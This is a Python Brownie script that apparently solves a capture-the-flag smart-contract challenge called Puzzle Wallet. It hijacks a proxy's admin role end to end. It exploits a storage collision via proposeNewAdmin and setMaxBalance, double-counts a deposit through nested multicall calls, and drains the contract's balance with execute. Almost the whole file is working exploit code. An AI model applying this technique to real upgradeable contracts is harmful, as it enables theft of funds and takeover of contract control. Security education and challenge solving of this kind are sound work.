from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from scripts.helper.web3 import web3
from brownie import PuzzleProxy, PuzzleWallet

##########################################
# You'll need to hijack this wallet to become the admin of the proxy.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        puzzleproxy = load_challenge(ContractObject=PuzzleProxy, instance_key='puzzlewallet')
    else:
        puzzleproxy = deploy_locally(ContractObject=PuzzleProxy, from_account=_from)

    # obtain implementation address
    storage_position_impl_address = hex(int(web3.sha3(text='eip1967.proxy.implementation').hex(),16)-1)
    implementation_address = f'0x{web3.eth.get_storage_at(puzzleproxy.address, storage_position_impl_address).hex()[-40:]}'

    # get puzzlewallet contract instance
    puzzlewallet = PuzzleWallet.at(implementation_address)

    # become pendingAdmin
    puzzleproxy.proposeNewAdmin(acc.address, _from)

    # whitelist my address
    whitelist_address_data = puzzlewallet.addToWhitelist.encode_input(acc.address)
    acc.transfer(to=puzzleproxy.address, amount=0, data=whitelist_address_data)

    # multicall tx data
    deposit_data = puzzlewallet.deposit.encode_input()
    multicall_data = puzzlewallet.multicall.encode_input([deposit_data])
    # nest the call
    multicall_data = puzzlewallet.multicall.encode_input([deposit_data, multicall_data]) 
    acc.transfer(to=puzzleproxy.address, amount=puzzleproxy.balance(), data=multicall_data)

    # execute data
    execute_data = puzzlewallet.execute.encode_input(acc.address, puzzleproxy.balance(), "")
    acc.transfer(to=puzzleproxy.address, amount=0, data=execute_data)

    # set max balance in order to replace memory slot for proxy admin
    max_balance_data = puzzlewallet.setMaxBalance.encode_input(int(acc.address, 16))
    acc.transfer(to=puzzleproxy.address, amount=0, data=max_balance_data)

    # check if my address is the admin address
    admin_assertion = puzzleproxy.admin() == acc.address
    print(f'The admin of the contract is {acc.address}, therefore my address is admin: {admin_assertion}')

    return admin_assertion

def main():
    solve_challenge()
